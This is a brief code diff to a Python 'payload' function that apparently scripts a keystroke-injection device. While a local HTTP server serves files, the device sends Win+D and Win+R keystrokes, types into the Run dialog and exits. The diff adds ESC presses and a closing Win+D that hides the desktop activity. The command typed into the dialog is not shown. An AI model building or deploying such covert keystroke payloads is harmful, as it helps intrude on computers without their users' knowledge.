@@ -73,6 +73,9 @@ def payload(web_dir, httpd):
 	httplistener=Process(target=httpd.handle_request)
 	httplistener.start()
 	os.chdir("..")
+	for i in range(5):
+		eco.press("ESC")
+		sleep(0.3)
 	eco.press("LGUI+d")
 	sleep(0.5)
 	eco.press("LGUI+r")
@@ -91,6 +94,8 @@ def payload(web_dir, httpd):
 	httplistener.join(2)
 	eco.type("exit")
 	eco.press("ENTER")
+	eco.press("LGUI+d")
+
 
 # Ensures simple gadget is selected
 __location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
